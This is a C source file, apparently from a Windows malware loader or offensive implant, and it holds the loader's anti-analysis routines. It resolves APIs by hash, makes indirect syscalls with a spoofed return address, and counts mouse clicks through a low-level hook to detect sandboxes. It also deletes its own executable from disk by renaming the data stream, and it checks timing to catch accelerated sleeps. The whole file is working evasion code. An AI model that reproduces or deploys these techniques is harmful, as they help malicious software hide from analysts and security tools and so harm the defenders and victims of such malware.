#include "Common.h"

#ifdef ANTIANALYSIS

HHOOK g_hMouseHook = NULL;

DWORD g_dwMouseClicks = NULL;

extern API_HASHING g_Api;
extern LPVOID spoofJump;
extern DWORD SyscallId;
extern HMODULE hKernel32;
extern HMODULE hNtdll;

BOOL Init2() {

	HMODULE hUser32 = GetModuleHandleH(USER32DLL_JOAA);
	
	g_Api.pCallNextHookEx = (fnCallNextHookEx)GetProcAddressH(hUser32, CallNextHookEx_JOAA);
	g_Api.pSetWindowsHookExW = (fnSetWindowsHookExW)GetProcAddressH(hUser32, SetWindowsHookExW_JOAA);
	g_Api.pGetMessageW = (fnGetMessageW)GetProcAddressH(hUser32, GetMessageW_JOAA);
	g_Api.pDefWindowProcW = (fnDefWindowProcW)GetProcAddressH(hUser32, DefWindowProcW_JOAA);
	g_Api.pUnhookWindowsHookEx = (fnUnhookWindowsHookEx)GetProcAddressH(hUser32, UnhookWindowsHookEx_JOAA);

	g_Api.pGetModuleFileNameW = (fnGetModuleFileNameW)GetProcAddressH(hKernel32, GetModuleFileNameW_JOAA);
	g_Api.pCreateFileW = (fnCreateFileW)GetProcAddressH(hKernel32, CreateFileW_JOAA);
	g_Api.pSetFileInformationByHandle = (fnSetFileInformationByHandle)GetProcAddressH(hKernel32, SetFileInformationByHandle_JOAA);
	g_Api.pGetTickCount64 = (fnGetTickCount64)GetProcAddressH(hKernel32, GetTickCount64_JOAA);

	return TRUE;
}

LRESULT CALLBACK HookEvent(int nCode, WPARAM wParam, LPARAM lParam) {

	if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
		g_dwMouseClicks++;
	}

	return g_Api.pCallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}

BOOL MouseClicksLogger() {

	MSG 	Msg = { 0 };

	g_hMouseHook = g_Api.pSetWindowsHookExW(
		WH_MOUSE_LL,
		(HOOKPROC)HookEvent,
		NULL,
		NULL
	);

	while (g_Api.pGetMessageW(&Msg, NULL, NULL, NULL)) {
		g_Api.pDefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
	}

	return TRUE;
}

BOOL DeleteSelf() {

	WCHAR				    szPath[MAX_PATH * 2] = { 0 };
	FILE_DISPOSITION_INFO	Delete = { 0 };
	HANDLE				    hFile = INVALID_HANDLE_VALUE;
	PFILE_RENAME_INFO		pRename = NULL;
	CONST PWCHAR NewStream = (CONST PWCHAR)NEW_STREAM;
	SIZE_T				    sRename = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);

	pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
	if (!pRename) {
		return FALSE;
	}

	ZeroMemory(szPath, sizeof(szPath));
	ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));

	Delete.DeleteFile = TRUE;

	pRename->FileNameLength = sizeof(NewStream);
	RtlCopyMemory(pRename->FileName, NewStream, sizeof(NewStream));

	if (g_Api.pGetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
		return FALSE;
	}

	hFile = g_Api.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	if (!g_Api.pSetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
		return FALSE;
	}

	GetSyscallId(hNtdll, &SyscallId, NtClose_JOAA);
	setup(SyscallId, spoofJump);
	executioner(hFile);

	hFile = g_Api.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE && GetLastError() == ERROR_FILE_NOT_FOUND) {
		return TRUE;
	}
	if (hFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	if (!g_Api.pSetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {
		return FALSE;
	}

	GetSyscallId(hNtdll, &SyscallId, NtClose_JOAA);
	setup(SyscallId, spoofJump);
	executioner(hFile);

	HeapFree(GetProcessHeap(), 0, pRename);

	return TRUE;
}


BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {

	DWORD                   dwMilliSeconds = ftMinutes * 60000;
	LARGE_INTEGER           DelayInterval = { 0 };
	LONGLONG                Delay = NULL;
	NTSTATUS                STATUS = NULL;
	DWORD                   _T0 = NULL,
		_T1 = NULL;

	Delay = dwMilliSeconds * 10000;
	DelayInterval.QuadPart = -Delay;

	_T0 = g_Api.pGetTickCount64();

	GetSyscallId(hNtdll, &SyscallId, NtDelayExecution_JOAA);
	setup(SyscallId, spoofJump);
	if ((STATUS = executioner(FALSE, &DelayInterval)) != 0x00 && STATUS != STATUS_TIMEOUT) {
		return FALSE;
	}

	_T1 = g_Api.pGetTickCount64();

	if ((DWORD)(_T1 - _T0) < dwMilliSeconds)
		return FALSE;

	return TRUE;
}

BOOL AntiAnalysis(DWORD dwMilliSeconds) {

	HANDLE					hThread = NULL;
	NTSTATUS				STATUS = NULL;
	LARGE_INTEGER			DelayInterval = { 0 };
	FLOAT					i = 1;
	LONGLONG				Delay = NULL;

	Init2();

	Delay = dwMilliSeconds * 10000;
	DelayInterval.QuadPart = -Delay;

	while (i <= 10) {

		GetSyscallId(hNtdll, &SyscallId, NtCreateThreadEx_JOAA);
		setup(SyscallId, spoofJump);
		if ((STATUS = executioner(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, MouseClicksLogger, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
			return FALSE;
		}

		GetSyscallId(hNtdll, &SyscallId, NtWaitForSingleObject_JOAA);
		setup(SyscallId, spoofJump);
		if ((STATUS = executioner(hThread, FALSE, &DelayInterval)) != 0 && STATUS != STATUS_TIMEOUT) {
			return FALSE;
		}

		GetSyscallId(hNtdll, &SyscallId, NtClose_JOAA);
		setup(SyscallId, spoofJump);
		if ((STATUS = executioner(hThread)) != 0) {
			return FALSE;
		}

		if (g_hMouseHook && !g_Api.pUnhookWindowsHookEx(g_hMouseHook)) {
			return FALSE;
		}

		if (!DelayExecutionVia_NtDE((FLOAT)(i / 2)))
			return FALSE;

		if (g_dwMouseClicks > 5)
			return TRUE;

		g_dwMouseClicks = NULL;

		i++;
	}

	return FALSE;
}

#endif